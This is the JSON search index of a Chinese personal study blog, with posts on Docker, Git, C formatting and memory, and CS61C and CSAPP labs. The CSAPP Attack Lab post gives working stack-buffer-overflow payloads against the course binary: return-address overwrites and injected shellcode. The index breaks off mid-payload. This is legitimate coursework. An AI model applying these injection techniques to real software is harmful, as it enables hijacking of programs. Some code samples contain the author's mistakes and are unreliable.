{"meta":{"title":"凌晨九点空间","subtitle":"Dawn at Nine","description":"分享知识、分享经验、分享观点","author":"凌晨九点","url":"https://lcjd99.github.io","root":"/"},"pages":[{"title":"categories","date":"2024-04-02T15:36:31.000Z","updated":"2024-04-02T15:41:54.089Z","comments":true,"path":"categories/index.html","permalink":"https://lcjd99.github.io/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2024-04-02T15:37:45.000Z","updated":"2024-04-02T15:37:45.780Z","comments":true,"path":"tags/index.html","permalink":"https://lcjd99.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"docker 入门教程（一）：基本用法","slug":"utils/docker/docker-1","date":"2024-04-26T14:50:47.000Z","updated":"2024-04-27T15:45:07.262Z","comments":true,"path":"utils/docker/docker-1/","permalink":"https://lcjd99.github.io/utils/docker/docker-1/","excerpt":"","text":"Docker允许用户将基础设施中的应用单独分割出来，形成更小的颗粒，从而提高交付软件的速度。 Docker容器与虚拟机类似，但二者在原理上不同。容器是将操作系统层虚拟化，虚拟机则是虚拟化硬件，因此容器更具有便携性、更能高效地利用服务器。 本文基于docker的官方文档，对使用过程中的一些基本使用规则做一个记录。 并且将以一个简单的 C 程序为例，构建一个可运行镜像 一、基本模型 和其他教程一样，作为基本用法的篇章，我不会对其具体原理有过多的阐述。 下图是从docker官网找到的架构图 作为入门用户，需要理解的概念是 镜像 和 容器 。 镜像为正在运行的容器提供使用隔离的文件系统。这个独立的文件系统由映像提供，并且映像必须包含运行应用程序所需的所有内容——所有依赖项、配置、脚本、二进制文件等。映像还包含容器的其他配置，例如环境变量、要运行的默认命令和其他元数据。 容器是在主机上运行的沙盒进程，它与在该主机上运行的所有其他进程隔离。 其实可以将其大致理解为类和对象的关系，镜像相当于为当前的环境构建的一个类，而生成的容器相当于为类构建的对象。只不过这个类实际上是对系统环境的虚拟化。 二、通过 Dockerfile 构建镜像 首先有一个简单的项目结构如下： 123hello_docker/├── main.c└── Makefile 其中main.c如下 12345#include &lt;stdio.h&gt;int main() &#123; printf(&quot;Hello Docker&quot;);&#125; Makefile如下: 12345678910111213CC=gccCFLAGS=-Wallall: mainmain: main.o $(CC) $(CFLAGS) -o main main.omain.o: main.c $(CC) $(CFLAGS) -c main.cclean: rm -f main main.o 这是添加一个文件为Dockerfile 12345FROM ubuntu:20.04WORKDIR /appCOPY . . RUN apt-get update &amp;&amp; apt-get install -y gccCMD [&quot;make&amp;&amp;./main&quot;] 代表我们构建镜像的方式，是以ubuntu20.04 作为基础，将目录复制到镜像的文件中，同时在其中更新软件包下载gcc编译器，并执行程序。 这是在当前目录下输入: 1docker build -t hello-docker . docker服务会按照Dockerfile的描述执行构建镜像，其中 -t 代表为镜像打tag。 然后根据镜像构建容器 1docker run hello-docker 我们将看到程序在docker中执行。","categories":[{"name":"docker","slug":"docker","permalink":"https://lcjd99.github.io/categories/docker/"}],"tags":[{"name":"utils","slug":"utils","permalink":"https://lcjd99.github.io/tags/utils/"}]},{"title":"git 入门教程（一）：基本用法","slug":"utils/git/git-1","date":"2024-04-15T14:50:47.000Z","updated":"2024-04-27T14:47:30.598Z","comments":true,"path":"utils/git/git-1/","permalink":"https://lcjd99.github.io/utils/git/git-1/","excerpt":"","text":"Git是一个免费的开源分布式版本控制系统，旨在以快速和高效的方式处理项目的所有内容。 本博客是对 pro git 的学习笔记 ，并配合一些自己使用的理解。 一 、基本模型 在这一篇文章不会对git的模型进行深入的介绍(后续会具体探讨)，读者只需要知道当前目录暂存区(stage)、本地提交区(暂时这样表示)就可以了。 git在创建仓库后对版本控制的操作都需要通过添加暂存区后再提交。假如当前目录中有大量文件被修改，而为保证结构清晰，需要分别成多次快照的保存，就可以分别添加到暂存区再提交。 二、 基本命令 以下命令直接以git [command] -h的格式就可以看到参数使用规则 2.1 基本的基本 创建仓库 1git init 该命令创建一个新的git仓库，其原理会在下一篇文章中说明。 添加暂存区 1git add &lt;files&gt; 通过此命令可以将指定文件或者目录添加到暂存区。 tldr 使用git add . 快速添加当前目录下全部修改文件到暂存区 提交暂存区内容 1git commit 这里需要说明的是每次commit的都需要有相应的信息，表示本次提交对代码的修改，git会自动打开默认的编辑器在你填写完提交信息后关闭即可。 tldr 使用git commit -m &quot;text&quot; 可以直接添加简单的提交信息而不打开编辑器 使用git commit -a 提交所有修改的文件 2.2 查看提交历史 可以查看仓库的完整提交历史 1git log tldr 使用git log -p -2 查看最近两次提交的修改 使用git log --stat 统计每次的变更信息 使用git log --pretty=oneline 查看一行信息 2.3 查看当前仓库状态 这里借用 pro git 中对仓库状态转移的图描述其过程 1git status tldr 使用git status -s 可以查看简短的文件状态信息 使用*.gitignore*文件可以配置不被git追踪的文件(支持正则表达式) 2.4 回滚文件 重做提交 如果你认为上一次提交并不完整，你可以使用： 1git commit --amend 该命令将暂存区和上次提交的信息一起提交，并进入修改信息的编辑器界面 重做暂存区 如果将将暂存区中的某个文件移出暂存区可以使用： 1git reset HEAD &lt;file&gt; 文件状态回滚 这是有风险的操作，被回滚的操作无法撤回 如果你不希望文件的修改，并希望上次提交状态可以使用： 1git restore &lt;file&gt; 或者 1git checkout -- &lt;file&gt; 2.5 分支管理 创建分支 每次提交都像链表一样被记录，而分支就像是从链表中分岔出的一条路，最后能合并回这个主路上。这样使用的理由也很简单，就像是支线任务。 1git branch &lt;branchName&gt; tldr 使用git branch -a查看所有分支 使用git branch -d &lt;branchName&gt;删除指定分支 切换分支 创建分支后实际上还在原来的分支中，需要切换到指定的分支中 1git checkout &lt;branchName&gt; tldr 使用git checkout -b &lt;branchName&gt;可以直接新建并切换到新的分支 合并分支 当需要将一个分支和另一个分支合并时就会用到合并分支的功能 1git merge &lt;branchName&gt; 表示将该分支合并到当前分支中 这其中可能会产生冲突， 2.5 远程仓库管理 克隆仓库 当需要使用远程仓库的时候需要克隆仓库，这里的远程仓库地址未必是一个url也可以是在同一文件系统下的另一个目录 1git clone &lt;repo&gt; [your_repo_name] 通过以上能够克隆一个完整仓库到指定目录下，需要注意在克隆时路径下不能有相同文件名的目录。 如果仓库是克隆的，那该仓库会有一个默认origin的远程仓库地址 1git remote 上述命令可以查看本仓库的远程仓库 tldr 使用git remote show &lt;name&gt; 查看远程仓库的完整信息 使用git remote get-url &lt;name&gt; 可以查看指定远程仓库的url 使用git remote set-url &lt;name&gt; &lt;url&gt; 可以为添加指定远程仓库的url 远程拉取 当远程仓库更新后，我们也要积极更新本地仓库以保证和远程同步 1git fetch &lt;remote&gt; 该操作并不会将远程仓库更新的代码自动合并到当前分支中，而是将远程仓库中的分支作为一个本地分支存储，需要手动将远程分支合并到当前分支中（具体操作同合并分支） 也可以使用 git pull 能够将上述操作同时执行，拉取并合并。 远程推送 当需要将本地提交的代码推送到远程仓库中时需要使用以下： 1git push &lt;remote&gt; &lt;branch&gt; 该指令将本地的指定分支推送到远程仓库中","categories":[{"name":"git","slug":"git","permalink":"https://lcjd99.github.io/categories/git/"}],"tags":[{"name":"utils","slug":"utils","permalink":"https://lcjd99.github.io/tags/utils/"}]},{"title":"【考研】计组 （二）： 数据的表示和运算","slug":"Postgraduate/CS/Organization/Lecture2","date":"2024-04-12T14:51:47.000Z","updated":"2024-04-14T15:22:23.011Z","comments":true,"path":"Postgraduate/CS/Organization/Lecture2/","permalink":"https://lcjd99.github.io/Postgraduate/CS/Organization/Lecture2/","excerpt":"","text":"经过做题的实践发现，对于原码、补码、移码等运算除了掌握计算机基本的运算规则以外还有一些共性的规律，利用这些规律可以更快速的解题，将我总结的规律记录如下。 一、定点数编码解题技巧 1.0 一些常识 28=2562^8 = 25628=256 216=655362^{16} = 65536216=65536 8位数最大表示为 27−12^7 - 127−1，计算机中始终从0位开始数 相同位数的补码和移码表示的数据范围相同 1.1 补码的规律 一个8位的数用补码表示其表示范围是 2−72^{-7}2−7 到 27−12^{7} - 127−1 思考方式：补码不对称，0将正数的一个位置占了，因此正数少一个， 同时 777 位最多表示 272^727 个数，应此得到这个结果 一个8位的负数通过补码计算真值的时候如果这个数除符号位的部分容易确定大小，可以直接用公式 −(28−m)-(2^8 - m)−(28−m) 得到结果，其中mmm 是这个正数。 思考方式： 这个实际上是补码的定义，有时候比化成反码再算要快 补码的数值变化规律： 实际上是两个递增的一次函数，其中断点在000 处， 在单调区间内可以直接比较大小 思考方式： 别想了，容易倒腾乱 有符号数和无符号数的转化关系，具体例子如下 123short a = -32767;unsigned short b = a;printf(&quot;%d\\n&quot;, b); 对于这个问题求解为 $b = 2^{16} - |a| $ 思考方法： $ a = 2^{15} - |m|$ ， 同时 b=215+∣m∣b = 2^{15} + |m|b=215+∣m∣ , 其中 mmm 就是除最高位的表示数 1.2 移码的规律 偏移为127的移码","categories":[{"name":"考研","slug":"考研","permalink":"https://lcjd99.github.io/categories/%E8%80%83%E7%A0%94/"}],"tags":[{"name":"Computer Organization","slug":"Computer-Organization","permalink":"https://lcjd99.github.io/tags/Computer-Organization/"}]},{"title":"C语言格式化输出问题","slug":"others/c-format-output","date":"2024-04-04T14:51:47.000Z","updated":"2024-04-10T09:12:21.579Z","comments":true,"path":"others/c-format-output/","permalink":"https://lcjd99.github.io/others/c-format-output/","excerpt":"","text":"在日常使用中C语言时，对于命令行工具输出格式化控制非常重要，虽然每天都在用printf但是对其具体的使用还是很容易忘记，于是做如下总结 在 C 语言中，格式化打印主要通过 printf、sprintf、snprintf、fprintf 等函数实现，它们都使用格式字符串来指定输出数据的类型和格式。格式字符串由普通字符和格式指定符组成，格式指定符用来指定随后参数的打印方式。 常用的格式指定符： %d：输出有符号十进制整数。 %u：输出无符号十进制整数。 %x 或 %X：输出十六进制整数，%x 输出小写字母，%X 输出大写字母。 %o：输出八进制整数。 %f：输出浮点数。 %e 或 %E：输出指数形式的浮点数，%e 使用小写 e，%E 使用大写 E。 %g 或 %G：输出浮点数，自动选择 %f 或 %e/%E 的格式，取决于数值的大小。 %c：输出单个字符。 %s：输出字符串。 %p：输出指针的值（十六进制表示）。 %%：输出一个百分号 %。 除了上述基本的格式指定符，还可以在 % 和格式字符之间插入一些标志、宽度、精度等修饰符： 标志方式 标志： -：左对齐输出。 +：输出数值的正负号。 （空格）：如果第一个字符不是正负号，则在该字符前添加一个空格。 #：对于 %o、%x、%X，添加前缀 0、0x、0X；对于 %f、%e、%E，强制显示小数点；对于 %g、%G，防止尾部零被删除。 0：用零填充空位。 宽度和精度 宽度：指定输出字段的最小宽度。如果输出小于这个宽度，会在左边或右边填充空格或零（取决于是否使用了 - 或 0 标志）。 精度： 对于 %f、%e、%E，精度表示小数点后的数字位数。 对于 %g、%G，精度表示有效数字的最大位数。 对于 %s，精度表示输出字符串的最大长度。 对于整数类型，精度表示最小数字位数，不足部分会填充零。 例子 123456789101112131415161718#include &lt;stdio.h&gt;int main() &#123; int i = 42; float f = 3.14159; char s[] = &quot;Hello, World!&quot;; printf(&quot;Integer: %d\\n&quot;, i); // 基本整型输出 printf(&quot;Integer with width: %10d\\n&quot;, i); // 宽度为10，右对齐 printf(&quot;Integer with width and zero padding: %010d\\n&quot;, i); // 宽度为10，用零填充 printf(&quot;Float: %f\\n&quot;, f); // 基本浮点数输出 printf(&quot;Float with precision: %.2f\\n&quot;, f); // 保留两位小数 printf(&quot;String: %s\\n&quot;, s); // 字符串输出 printf(&quot;String with precision: %.5s\\n&quot;, s); // 只输出字符串的前5个字符 return 0;&#125; 注意事项 确保格式指定符与提供的参数类型相匹配，否则可能会导致未定义的行为。 使用 %s 输出字符串时，确保字符串以 null 结尾，否则可能会读取到不确定的数据。 使用 % 打印百分号时，需要写成 %%。 注意 printf 家族函数的安全性问题，如缓冲区溢出。建议使用 snprintf 或 fgets/fputs 来避免这类问题。","categories":[{"name":"others","slug":"others","permalink":"https://lcjd99.github.io/categories/others/"}],"tags":[{"name":"C","slug":"C","permalink":"https://lcjd99.github.io/tags/C/"}]},{"title":"重新学习C语言内存管理","slug":"others/c-and-memory","date":"2024-04-03T14:50:47.000Z","updated":"2024-04-10T09:12:38.701Z","comments":true,"path":"others/c-and-memory/","permalink":"https://lcjd99.github.io/others/c-and-memory/","excerpt":"","text":"前言 在学习完操作系统MIT6.828后重新学习C语言的内存管理问题。 关于标准库 malloc 和 free 在C标准库中对内存的管理是通过为每个空闲内存提供一个小的数据结构来管理的，大致的伪代码如下 1234struct block &#123; int size; //内存块的大小 struct block* next; //下一个内存块的指针&#125; 也就是说这是一个记录空闲空间的循环链表(自己实现的JOS实际上也是这样管理内存)。 malloc 的过程 malloc 会根据申请内存的大小，在其中找到一个足够大的块，将这个块移出链表，并将指针返回。如果没有足够大的块，就会像操作系统申请空间，如果仍然无法满足会返回分配失败 在malloc的过程中还存在多个块满足条件如何选择的问题，此时会涉及到三种策略： best-fit ： 分配大小最合适的块 firtst-fit ： 分配最先找到的满足条件的块 next-fit ： 在每次遍历过程中记录位置，分配记录位置后下一个满足的块 free 的过程 free 会将参数中指定的内存块加入到空闲块链表中，同时检查临近(物理空间)的块是否空闲，如果空闲会合并为一个更大的块。 使用时注意 malloc 二维数组的时候首先分配一维的指针，在循环分配空间，不能分配连续的空间","categories":[{"name":"others","slug":"others","permalink":"https://lcjd99.github.io/categories/others/"}],"tags":[{"name":"C","slug":"C","permalink":"https://lcjd99.github.io/tags/C/"}]},{"title":"【CS61C】Lab2 实验解析","slug":"Course/cs61c/Lab2","date":"2024-03-04T14:51:47.000Z","updated":"2024-04-27T15:04:14.566Z","comments":true,"path":"Course/cs61c/Lab2/","permalink":"https://lcjd99.github.io/Course/cs61c/Lab2/","excerpt":"","text":"前言 本人学习的是 2020 fall版的CS61C，本文将对Lab2解题思路做大致介绍，具体代码可以参考我的仓库 解题思路 Exercise 1: Bit Operations 三道位运算的题目中值得一说的是第二道，函数接口如下 123// Set the nth bit of the value of x to v.// Assume 0 &lt;= n &lt;= 31, and v is 0 or 1void set_bit(unsigned * x, unsigned n, unsigned v); 题目限制如下 You may ONLY use bitwise operations such as and (&amp;), or (|), xor (^), not (~), left shifts («), and right shifts (»). You may not use any for/while loops or conditional statements. You also may not use modulo (%), division, addition subtraction, or multiplication for this question. 我的解题思路是: 首先分析只有当需要变化的位xnx_nxn​和nnn不同时才会发生改变。 需要通过位运算找到位反转的方式和判断不同的方式 位反转：通过异或实现 判断不同： 通过移位到最低位比较得到 具体代码如下 1234void set_bit(unsigned * x, unsigned n, unsigned v) &#123; unsigned bit = ((*x) &gt;&gt; n) &amp; 1; (*x) ^= ((bit ^ v) &lt;&lt; n);&#125;","categories":[{"name":"CS61C","slug":"CS61C","permalink":"https://lcjd99.github.io/categories/CS61C/"}],"tags":[{"name":"C","slug":"C","permalink":"https://lcjd99.github.io/tags/C/"}]},{"title":"CSAPP深入理解计算机系统 Lab4(architecture Lab) 详解","slug":"Course/csapp/Lab4","date":"2023-10-25T14:51:47.000Z","updated":"2024-04-12T15:35:52.341Z","comments":true,"path":"Course/csapp/Lab4/","permalink":"https://lcjd99.github.io/Course/csapp/Lab4/","excerpt":"","text":"本文以记录个人学习CSAPP的过程，使用blog的方式记录能更专注的思考，不至于走马观花式的做实验。同时我关注的不仅是实验本身还有实验中使用工具的学习。 实验说明 在官方网站上其实有两个版本的architecture Lab，这里我们使用的是CSAPP 3e的实验。 本实验通过自己动手写汇编代码，自己设计CPU的执行过程，优化执行过程从而对计算机中CPU执行过程和流水线等知识有更深刻的理解，我认为是目前几个实验中最灵活的一个。 具体实验环境的搭建在实验手册中都有讲解，同时还有一个关于Y86模拟器的使用说明，都在下载的项目目录下有。 特别说明：本实验要求使用Y86的汇编语言，需要参考CSAPP第4章的相关内容学习后再动手编写。 实验具体流程 Part A 根据实验说明，我们需要实现在example.c中三个函数的Y86-64版本的汇编代码，在编写汇编代码前，需要简要梳理一下Y86-64的语法规则，这里建议详细阅读原书的4.1章节，我只对关键部分进行说明： 通用寄存器有15个(没有%15) 指令集设计如下图 ![指令集](/Users/lcjd/Library/Application Support/typora-user-images/image-20231109164413862.png) 在原书的4.1.5节对一个完整的汇编代码有详细的介绍，这里就不过多说明。在本实验中有一部分代码包括栈的设置、测试数据初始化的部分是共用的代码，我将其写在这里。 12345678910111213141516171819202122232425 .pos 0 irmovq stack, %rsp call main halt .align 8ele1: .quad 0x00a .quad ele2ele2: .quad 0x0b0 .quad ele3ele3: .quad 0xc00 .quad 0 main: irmovq ele1, %rdi # call the function call func ret # the positon insert function .pos 0x200stack: sum.ys 这里需要写一个链表元素值求和的汇编代码，并给出测试数据。具体编写思路只需要按照c代码对应翻译即可 函数部分代码如下 123456789101112131415sum_list: irmovq $8, %r8 irmovq $0, %rax andq %rdi, %rdi jmp testloop: mrmovq (%rdi), %r10 addq %r10, %rax addq %r8, %rdi mrmovq (%rdi), %rdi andq %rdi, %rditest: jne loop ret 代码中需要说明的是由于y86_64中没有立即数的加法运算，需要我们将需要运算的数存放在寄存器中再进行寄存器的加法运算。 将这部分代码加入公共代码的部分后结果保存在sum.ys中。调用make sum.yo通过汇编器将代码编译为可执行程序sum.yo，然后调用./yis sum.yo 结果如下 1234567891011$ ./yis sum.yoStopped in 30 steps at PC = 0x13. Status &#x27;HLT&#x27;, CC Z=1 S=0 O=0Changes to registers:%rax: 0x0000000000000000 0x0000000000000cba%rsp: 0x0000000000000000 0x0000000000000200%r8: 0x0000000000000000 0x0000000000000008%r10: 0x0000000000000000 0x0000000000000c00Changes to memory:0x01f0: 0x0000000000000000 0x000000000000005b0x01f8: 0x0000000000000000 0x0000000000000013 通过rax的验证我们知道，程序正确执行。 rsum.ys 递归无法像迭代一样完全翻译程序，因为递归程序在汇编代码中需要维护递归栈，但是我们不需要将所有当前变量都保存在栈中，根据需求我们只需要把当前结点的值保存在栈中,因此只需要为每次递归分配8B的空间即可，并和递归调用的返回值相加即可。 函数部分代码如下： 1234567891011121314sum_list: irmovq $8, %r8 irmovq $0, %rax andq %rdi, %rdi jmp testloop: mrmovq (%rdi), %r10 addq %r10, %rax addq %r8, %rdi mrmovq (%rdi), %rdi andq %rdi, %rditest: jne loop ret 执行同样的测试结果如下： 12345678910111213141516171819$ ./yis rsum.yoStopped in 48 steps at PC = 0x13. Status &#x27;HLT&#x27;, CC Z=0 S=0 O=0Changes to registers:%rax: 0x0000000000000000 0x0000000000000cba%rsp: 0x0000000000000000 0x0000000000000200%r8: 0x0000000000000000 0x0000000000000008%r10: 0x0000000000000000 0x0000000000000c00%r11: 0x0000000000000000 0x000000000000000aChanges to memory:0x01c0: 0x0000000000000000 0x000000000000009c0x01c8: 0x0000000000000000 0x0000000000000c000x01d0: 0x0000000000000000 0x000000000000009c0x01d8: 0x0000000000000000 0x00000000000000b00x01e0: 0x0000000000000000 0x000000000000009c0x01e8: 0x0000000000000000 0x000000000000000a0x01f0: 0x0000000000000000 0x000000000000005b0x01f8: 0x0000000000000000 0x0000000000000013 验证rax的结果说明程序正确执行。 copy.ys 这里只需要将三个参数传入即可，执行过程逻辑并不困难。具体代码如下。 123456789101112131415161718192021222324main: irmovq src, %rdi irmovq dest, %rsi irmovq $3, %rdx call copy_block retcopy_block: xorq %rax, %rax irmovq $8, %r8 irmovq $1, %r11L2: andq %rdx, %rdx je L3 mrmovq (%rdi), %r9 rmmovq %r9, (%rsi) subq %r11, %rdx xorq %r9, %rax addq %r8, %rdi addq %r8, %rsi jmp L2L3: halt ret 测试如下： 123456789101112131415161718$ ./yis copy.yoStopped in 39 steps at PC = 0xb6. Status &#x27;HLT&#x27;, CC Z=1 S=0 O=0Changes to registers:%rax: 0x0000000000000000 0x0000000000000cba%rsp: 0x0000000000000000 0x00000000000001f0%rsi: 0x0000000000000000 0x0000000000000048%rdi: 0x0000000000000000 0x0000000000000030%r8: 0x0000000000000000 0x0000000000000008%r9: 0x0000000000000000 0x0000000000000c00%r11: 0x0000000000000000 0x0000000000000001Changes to memory:0x0030: 0x0000000000000111 0x000000000000000a0x0038: 0x0000000000000222 0x00000000000000b00x0040: 0x0000000000000333 0x0000000000000c000x01f0: 0x0000000000000000 0x000000000000006f0x01f8: 0x0000000000000000 0x0000000000000013 看到内存中的变化过程和返回值rax的校验码验证实验结果正确。 PartB 这部分的实验是要为SEQ处理器添加一条指令iaddq，这里需要修改hcl文件中的控制逻辑，使其满足需求的功能。这个部分比较容易，因为框架都已经写好，我们只需要将iaddq添加到相应的部分即可。 首先我们需要思考一下iaddq需要实现的动作，根据下图我们看到该指令的构成，对我们解析指令非常重要。 ![iddq](/Users/lcjd/Library/Application Support/typora-user-images/image-20231109191110782.png) 我们可以以OPq和irmovq的指令作为案例可以设计出iaddq在各个步骤的执行如下(其中M_x,x表示取xByte) 12345678910111213141516Fetch： icode:ifun &lt;- M_1[PC] rA:rB &lt;- M_1[PC+1] ValC &lt;- M_8[PC+2] ValP &lt;- PC + 10Decode: valB &lt;- R[rB]Execute: ValE &lt;- ValC + ValB Set CCMemory：Write back: R[rB] &lt;- valEPC update: PC &lt;- valP 根据以上可以修改seq-full.hcl 1、在Symbolic representation of Y86-64 Instruction Codes的部分添加如下代码，用于表示这个指令的符号表示。 1wordsig IIADDQ &#x27;I_IADDQ&#x27; 2、然后以此添加IIADDQ到 instr_valid ， need_regids ， need_valC， srcA:rA ， srcB:rB， dstE:rB(second)， aluA:valC，aluB:valB， setcc 添加完后执行如下: ./ssim -t ../y86-code/asumi.yo (记得先在../y86-code目录下make一下)，简单测试后，执行cd ../y86-code; make testssim。结果如下： ![image-20231109195158473](/Users/lcjd/Library/Application Support/typora-user-images/image-20231109195158473.png) Part3 在这个部分我们需要优化ncopy函数在流水线中的执行效率，我们可以通过修改添加新的指令在系统中，也可以通过修改指令的执行顺序等方式，提供了很大的自由度，这需要我们充分了解计算机系统的指令级优化策略。这个部分也是这次实验的重点。 在没有任何优化时执行./benchmark.pl后的平均时间为15.18，接下来我们就要开始优化这个流水线 1. 添加iaddr 首先可以把Part2中的iaddr，这样可以减少指令数，提升执行效率，修改pipe-full.hcl的过程大同小异，这里就不赘述了，以下是对ncopy.ys的修改 12345678910111213141516 xorq %rax,%rax # count = 0; andq %rdx,%rdx # len &lt;= 0? jle Done # if so, goto Done: Loop: mrmovq (%rdi), %r10 # read val from src... rmmovq %r10, (%rsi) # ...and store it to dst andq %r10, %r10 # val &lt;= 0? jle Npos # if so, goto Npos: iaddq $1, %rax # count++Npos: iaddq $-1, %rdx # len-- iaddq $8, %rdi # src++ iaddq $8, %rsi # dst++ andq %rdx,%rdx # len &gt; 0? jg Loop # if so, goto Loop: 经过修改并验证正确性后测试结果为Average CPE 12.70 2. 根据分支修改代码 已知如下： 12345# Predict next value of PCword f_predPC = [ f_icode in &#123; IJXX, ICALL &#125; : f_valC; 1 : f_valP;]; 我们知道预测的方向是条件分支，而我们的代码中","categories":[{"name":"CSAPP","slug":"CSAPP","permalink":"https://lcjd99.github.io/categories/CSAPP/"}],"tags":[{"name":"C","slug":"C","permalink":"https://lcjd99.github.io/tags/C/"}]},{"title":"CSAPP深入理解计算机系统 Lab3(attack Lab) 详解","slug":"Course/csapp/Lab3","date":"2023-10-21T14:51:47.000Z","updated":"2024-04-12T15:34:46.881Z","comments":true,"path":"Course/csapp/Lab3/","permalink":"https://lcjd99.github.io/Course/csapp/Lab3/","excerpt":"","text":"本文以记录个人学习CSAPP的过程，使用blog的方式记录能更专注的思考，不至于走马观花式的做实验。同时我关注的不仅是实验本身还有实验中使用工具的学习。 实验说明 本实验通过向两个程序中进行攻击已达到攻击目的，通过这个实验能了解到通过缓冲区溢出的方法攻击程序的方法，同时对汇编代码、GDB和OBJDUMP等工具以及代码在机器中执行的过程的理解有更深的理解。 在动手实验之前需要仔细阅读实验说明, 本实验可以在实验说明的引导下顺利完成。 实验中主要包括两个可执行程序ctarget和rtarget，两个可执行程序都会从标准输入中读入一个字符串在缓冲区中，但是并不会检测是否会出现缓冲区溢出。但是程序会在反馈信息中表示是否出现缓冲区溢出。同时还有一个工具HEX2RAW，是为了方便我们将二进制代码(16进制表示方式)变成对应的ascii码串作为可执行程序的输入 其中有一些需要说明的重点： 在企图植入的代码中不应该包含0x0a，因为这在ascii中代表换行符，而实验中是按行读取 HEX2RAW 要按照小端序的方式写入，并且都要补齐两位。 一点小坑 出现报错 1FAILED: Initialization error: Running on an illegal host 由于我们无法连接到CMU的服务器，所以通常的执行方法会导致程序卡在等待服务器响应上，因此每次执行都需要带上-q的参数离线执行。 实验具体流程 Part1 Level1 (Phase 1) 这是一个热身实验，目标是让程序执行到一个目标位置的函数touch1。对于本题的思路如下： 首先我们需要知道touch1的的地址便于我们写入栈中，可以通过objdump -d &gt; source.S的方式找到其位置(文本编辑器的查找),查找到如下 100000000004017c0 g F .text 000000000000002c touch1 说明touch1的位置在0x4017c0的位置。我们的目标就是将这个地址放在栈记录函数返回值的地方，并在函数getbuf调用ret时进入这个部分代码。 然后我们需要知道buffer的大小，这里需要查看getbuf的代码，在Lab2中我主要通过阅读objdump -t的逆向汇编解题，这次我主要通过gdb来完成。我们执行gdb ctarget并直接b getbuf设置断点,然后r -q执行到断点位置。接着执行汇编如下 123456789(gdb) disasDump of assembler code for function getbuf:=&gt; 0x00000000004017a8 &lt;+0&gt;: sub $0x28,%rsp 0x00000000004017ac &lt;+4&gt;: mov %rsp,%rdi 0x00000000004017af &lt;+7&gt;: call 0x401a40 &lt;Gets&gt; 0x00000000004017b4 &lt;+12&gt;: mov $0x1,%eax 0x00000000004017b9 &lt;+17&gt;: add $0x28,%rsp 0x00000000004017bd &lt;+21&gt;: retEnd of assembler dump. 在这里能看到实际上分配的空间为0x28B。并且不会做缓冲区溢出的验证，我们可以先任意填充数据将缓存区填满，并在继续填写将返回值修改为0x00000000004017c0。但是需要注意的是小端序的存储方式，我们可以将数据以16进制的格式写入一个文本文件，便于 HEX2RAW 转换为我们需要的数据。我填写的数据在key_1.txt 12345600 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00 使用如下命令 123456789$ ./hex2raw -i key_1.txt | ./ctarget -qCookie: 0x59b997faType string:Touch1!: You called touch1()Valid solution for level 1 with target ctargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:1 Part1 Level2 (Phase 2) 这个部分的可以看到汇编代码中有如下部分 10x00000000004017fc &lt;+16&gt;: cmp 0x202ce2(%rip),%edi # 0x6044e4 &lt;cookie&gt; 直接给出了所需要比较的值cookie的位置，直接用gdb打印出结果 12(gdb) x/x 0x6044e40x6044e4 &lt;cookie&gt;: 0x59b997fa 现在的目标就变成如何将这个值写入到寄存器rdi中，根据提示信息我们不要使用除ret以外的其他跳转指令，所以就要借助栈即存储地址又存储指令。我们可以将将示意图表示如下 因为我们只能通过输入字符串的方式去攻击，所以我们能做的就是将函数返回地址改为栈中下一行的地址(这里的索引为示例，实际情况中栈的地址是向下增长的)，并将下一行作为注入函数的代码段，同时记得再将返回地址利用mov写入栈中，并将rsp寄存器移动到相应地方以利用ret进入touch2。 我的注入代码段如下： 123mov $0x59b997fa, %rdiadd $0x4, %rsp &quot; 通过后续代码长度计算需要加的长度,0x4是标记一下位置，方便找ret 将上述代码保存在a.S中，并执行 用于生成二进制代码 12340000000000000000 &lt;.text&gt;: 0: 48 c7 c7 fa 97 b9 59 mov $0x59b997fa,%rdi 7: 48 83 c4 04 add $0x4,%rsp b: c3 ret 这段代码中我们能看出我们需要将rsp移动b + 1也就是c，寻找touch2函数的地址方式见上一题，最终注入为 1234567891000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 a8 dc 61 55 00 00 00 00 //下一行的地址48 c7 c7 fa 97 b9 5948 83 c4 0c c3ec 17 40 00 00 00 00 00 执行结果如下 123456789$ ./hex2raw -i key_2.txt | ./ctarget -qCookie: 0x59b997faType string:Touch2!: You called touch2(0x59b997fa)Valid solution for level 2 with target ctargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:2 Part1 Level3 (Phase 3) 本题和上一题的区别不大，仅仅是改为注入一个字符串指针作为参数，我们可以将字符串的值存在栈中，而将参数传回，具体操作过程如下 注入的代码段和上一题格式相同，需要修改的参数是rdi的值应该为上图栈中第5行的部分。 首先我们需要知道字符串的值如下，这里我们直接利用gdb，我们先像第一个题一样直接将返回地址设置为touch3，并在touch3处设置断点开始执行，并单步调试到mov 0x202bd3(%rip),%edi后直接通过p/x $edi打印出其值为0x59b997fa，我们知道$rdi和$rsi作为参数传递给函数hexmatch中，通过disas hexmatch可以发现，该函数实际上通过__sprintf_chk这个库函数将$edi的值格式化为字符串，具体格式为&quot;%.8x&quot;表示以16进制方式转换，也就是是说转换后的字符串为&quot;59b997fa&quot;，说明我们需要在上图6的位置添入的就是这个字符串，字符串序列为35 39 62 39 39 37 66 61 00注意字符串末尾的 00 编写汇编如下： 123mov $0x22222222, %rspmov $0x22222222, %rdiret 其中的数后续根据具体地址修改 编译并反汇编后得到如下 123456Disassembly of section .text:0000000000000000 &lt;.text&gt;: 0: 48 c7 c4 22 22 22 22 mov $0x22222222,%rsp 7: 48 c7 c7 22 22 22 22 mov $0x22222222,%rdi e: c3 ret 我们可以根据上述地址加以修改，gdb中断点在getbuf处查看栈指针位置为 12(gdb) print $rsp$3 = (void *) 0x5561dca0 说明写入的位置在 0x5561dca0 + 0x8 + 0xe = 0x5561dcb7 和 0x5561dcb7 + 0x8 = 0x5561dcbf，这样就可以得出最终的代码二进制代码如下 123456789101100 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 a8 dc 61 55 00 00 00 